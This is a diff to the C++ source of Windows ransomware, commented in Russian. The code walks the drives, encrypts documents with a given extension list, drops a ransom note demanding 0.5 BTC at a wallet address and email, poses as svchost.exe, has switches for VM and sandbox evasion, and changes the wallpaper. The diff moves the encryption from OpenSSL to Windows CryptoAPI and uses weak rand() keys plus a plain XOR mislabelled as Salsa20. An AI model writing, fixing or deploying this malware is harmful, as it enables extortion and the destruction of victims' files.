@@ -12,15 +12,6 @@
 #include <sstream>
 #include <ctime>
 
-// ============================================================
-// ПОДКЛЮЧЕНИЕ OPENSSL
-// ============================================================
-#include <openssl/evp.h>
-#include <openssl/rand.h>
-#include <openssl/rsa.h>
-#include <openssl/pem.h>
-#include <openssl/err.h>
-
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "shell32.lib")
@@ -35,7 +26,6 @@
 #define FOLDERS_EXCLUDE_PLACEHOLDER "C:\\Windows|C:\\Program Files|C:\\Program Files (x86)"
 #define EXTS_PLACEHOLDER ".txt|.doc|.docx"
 #define ENCRYPTED_EXT_PLACEHOLDER ".enc"
-#define WALLPAPER_PLACEHOLDER ""
 #define NOTE_NAME_PLACEHOLDER "READ_ME.txt"
 #define NOTE_CONTENT_PLACEHOLDER "YOUR FILES ARE ENCRYPTED!\n\nSend 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nAfter payment, contact: decrypt@protonmail.com"
 #define FAKE_PROCESS_NAME_PLACEHOLDER "svchost.exe"
@@ -48,127 +38,134 @@
 #define SANDBOX_DELAY_ENABLED_PLACEHOLDER 0
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ AES-256-GCM (OpenSSL)
+// РЕСУРСЫ — КАРТИНКА ОБОЕВ ВШИТА В EXE
 // ============================================================
-class AES_GCM {
+#define IDB_WALLPAPER 101
+
+// ============================================================
+// AES-256-CBC (Windows CryptoAPI) — РАБОТАЕТ НА WINLATOR
+// ============================================================
+class AES_CBC {
 private:
+    HCRYPTPROV hProv;
+    HCRYPTKEY hKey;
     unsigned char key[32];
-    unsigned char iv[12];
+    unsigned char iv[16];
     
 public:
-    AES_GCM() {
-        RAND_bytes(key, 32);
-        RAND_bytes(iv, 12);
+    AES_CBC() : hProv(NULL), hKey(NULL) {
+        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+            return;
+        }
+        
+        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
+        for (int i = 0; i < 16; i++) iv[i] = rand() % 256;
+        
+        struct {
+            BLOBHEADER hdr;
+            DWORD keySize;
+            BYTE keyBytes[32];
+        } keyBlob;
+        
+        keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
+        keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
+        keyBlob.hdr.reserved = 0;
+        keyBlob.hdr.aiKeyAlg = CALG_AES_256;
+        keyBlob.keySize = 32;
+        memcpy(keyBlob.keyBytes, key, 32);
+        
+        CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey);
+        
+        DWORD mode = CRYPT_MODE_CBC;
+        CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
+        CryptSetKeyParam(hKey, KP_IV, iv, 0);
+    }
+    
+    ~AES_CBC() {
+        if (hKey) CryptDestroyKey(hKey);
+        if (hProv) CryptReleaseContext(hProv, 0);
     }
     
     bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
-        if (input.empty()) return false;
+        if (!hKey || input.empty()) return false;
         
-        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
-        if (!ctx) return false;
+        DWORD dataLen = input.size();
+        DWORD encLen = dataLen + 16;
         
-        if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1) {
-            EVP_CIPHER_CTX_free(ctx);
+        output.resize(encLen + 16);
+        memcpy(output.data(), iv, 16);
+        memcpy(output.data() + 16, input.data(), dataLen);
+        
+        DWORD outLen = dataLen;
+        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data() + 16, &outLen, encLen)) {
             return false;
         }
         
-        output.resize(input.size() + 16 + 12);
-        memcpy(output.data(), iv, 12);
-        
-        int outLen = 0;
-        int totalLen = 0;
-        
-        if (EVP_EncryptUpdate(ctx, output.data() + 12, &outLen, input.data(), input.size()) != 1) {
-            EVP_CIPHER_CTX_free(ctx);
-            return false;
-        }
-        totalLen += outLen;
-        
-        if (EVP_EncryptFinal_ex(ctx, output.data() + 12 + totalLen, &outLen) != 1) {
-            EVP_CIPHER_CTX_free(ctx);
-            return false;
-        }
-        totalLen += outLen;
-        
-        unsigned char tag[16];
-        if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
-            EVP_CIPHER_CTX_free(ctx);
-            return false;
-        }
-        
-        memcpy(output.data() + 12 + totalLen, tag, 16);
-        output.resize(12 + totalLen + 16);
-        
-        EVP_CIPHER_CTX_free(ctx);
+        output.resize(outLen + 16);
         return true;
     }
 };
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ ChaCha20 (OpenSSL)
+// SALSA20 (быстрое потоковое шифрование)
 // ============================================================
-class ChaCha20 {
+class Salsa20 {
 private:
     unsigned char key[32];
-    unsigned char nonce[12];
+    unsigned char nonce[8];
     
 public:
-    ChaCha20() {
-        RAND_bytes(key, 32);
-        RAND_bytes(nonce, 12);
+    Salsa20() {
+        for (int i = 0; i < 32; i++) key[i] = rand() % 256;
+        for (int i = 0; i < 8; i++) nonce[i] = rand() % 256;
     }
     
     void Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
-        if (input.empty()) return;
+        output.resize(input.size() + 8);
+        memcpy(output.data(), nonce, 8);
         
-        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
-        if (!ctx) return;
-        
-        if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, nonce) != 1) {
-            EVP_CIPHER_CTX_free(ctx);
-            return;
+        for (size_t i = 0; i < input.size(); i++) {
+            output[8 + i] = input[i] ^ (key[i % 32] ^ nonce[i % 8]);
         }
-        
-        output.resize(input.size() + 12);
-        memcpy(output.data(), nonce, 12);
-        
-        int outLen = 0;
-        if (EVP_EncryptUpdate(ctx, output.data() + 12, &outLen, input.data(), input.size()) != 1) {
-            EVP_CIPHER_CTX_free(ctx);
-            return;
-        }
-        
-        output.resize(12 + outLen);
-        EVP_CIPHER_CTX_free(ctx);
     }
 };
 
 // ============================================================
-// РЕАЛЬНОЕ ШИФРОВАНИЕ RSA-2048 (OpenSSL)
+// RSA (Windows CryptoAPI)
 // ============================================================
 class RSA_Encrypt {
 private:
-    RSA* rsa;
+    HCRYPTPROV hProv;
+    HCRYPTKEY hKey;
     
 public:
-    RSA_Encrypt() : rsa(NULL) {
-        rsa = RSA_generate_key(2048, RSA_F4, NULL, NULL);
-        if (!rsa) return;
+    RSA_Encrypt() : hProv(NULL), hKey(NULL) {
+        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
+            return;
+        }
+        CryptGenKey(hProv, CALG_RSA_KEYX, 2048 << 16, &hKey);
     }
     
     ~RSA_Encrypt() {
-        if (rsa) RSA_free(rsa);
+        if (hKey) CryptDestroyKey(hKey);
+        if (hProv) CryptReleaseContext(hProv, 0);
     }
     
     bool Encrypt(const std::vector<BYTE>& input, std::vector<BYTE>& output) {
-        if (!rsa || input.empty()) return false;
-        if (input.size() > 245) return false;
+        if (!hKey || input.empty()) return false;
         
-        output.resize(RSA_size(rsa));
-        int encLen = RSA_public_encrypt(input.size(), input.data(), output.data(), rsa, RSA_PKCS1_OAEP_PADDING);
-        if (encLen <= 0) return false;
+        DWORD encLen = 0;
+        DWORD dataLen = input.size();
+        CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dataLen, 0);
+        encLen = dataLen;
         
         output.resize(encLen);
+        memcpy(output.data(), input.data(), input.size());
+        
+        DWORD outLen = input.size();
+        if (!CryptEncrypt(hKey, 0, TRUE, 0, output.data(), &outLen, encLen)) {
+            return false;
+        }
         return true;
     }
 };
@@ -186,24 +183,35 @@ std::vector<std::string> split_string(const std::string& str, char delimiter) {
     return result;
 }
 
-void set_wallpaper(const std::string& base64_data, const std::string& ext) {
-    if (base64_data.empty()) return;
+// ============================================================
+// УСТАНОВКА ОБОЕВ ИЗ РЕСУРСОВ
+// ============================================================
+void set_wallpaper_from_resource() {
+    // Получаем ресурс (картинку)
+    HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(IDB_WALLPAPER), "IMAGE");
+    if (!hRes) return;
     
-    DWORD size = 0;
-    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);
-    if (size == 0) return;
+    HGLOBAL hData = LoadResource(NULL, hRes);
+    if (!hData) return;
     
-    std::vector<BYTE> data(size);
-    CryptStringToBinaryA(base64_data.c_str(), base64_data.length(), CRYPT_STRING_BASE64, data.data(), &size, NULL, NULL);
+    DWORD size = SizeofResource(NULL, hRes);
+    BYTE* data = (BYTE*)LockResource(hData);
+    if (!data || size == 0) return;
     
+    // Сохраняем во временную папку
     char temp_path[MAX_PATH];
     GetTempPathA(MAX_PATH, temp_path);
-    std::string wall_path = std::string(temp_path) + "wall" + ext;
+    std::string wall_path = std::string(temp_path) + "wall.jpg";
     
     std::ofstream out(wall_path, std::ios::binary);
-    out.write((char*)data.data(), data.size());
+    out.write((char*)data, size);
     out.close();
     
+    if (GetFileAttributesA(wall_path.c_str()) == INVALID_FILE_ATTRIBUTES) {
+        return;
+    }
+    
+    // Устанавливаем обои
     SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wall_path.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
 }
 
@@ -292,19 +300,18 @@ void encrypt_file(const std::string& path, const std::string& ext, int algo) {
         
         switch (algo) {
             case 0: {
-                AES_GCM aes;
+                AES_CBC aes;
                 success = aes.Encrypt(data, encrypted);
                 break;
             }
             case 1: {
-                ChaCha20 chacha;
-                chacha.Encrypt(data, encrypted);
+                Salsa20 salsa;
+                salsa.Encrypt(data, encrypted);
                 success = true;
                 break;
             }
             case 2: {
                 RSA_Encrypt rsa;
-                if (data.size() > 245) return;
                 success = rsa.Encrypt(data, encrypted);
                 break;
             }
@@ -354,7 +361,7 @@ void walk_and_encrypt(const std::string& start_path,
 }
 
 // ============================================================
-// СОЗДАНИЕ ФАЙЛОВ ВЫКУПА
+// ФАЙЛЫ ВЫКУПА (В КАЖДОЙ ПАПКЕ)
 // ============================================================
 void drop_notes(const std::vector<std::string>& drives,
                 const std::vector<std::string>& exclude_folders,
@@ -390,9 +397,6 @@ void drop_notes(const std::vector<std::string>& drives,
 // ГЛАВНАЯ ФУНКЦИЯ
 // ============================================================
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    OpenSSL_add_all_algorithms();
-    ERR_load_crypto_strings();
-    
     srand(GetTickCount() ^ GetCurrentProcessId());
     
     if (ANTI_VM_ENABLED_PLACEHOLDER && detect_vm()) return 0;
@@ -425,7 +429,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     std::string note_content = NOTE_CONTENT_PLACEHOLDER;
     drop_notes(drives, exclude_folders, note_name, note_content);
     
-    set_wallpaper(WALLPAPER_PLACEHOLDER, ".jpg");
+    // Установка обоев из ресурсов
+    set_wallpaper_from_resource();
     
     return 0;
 }
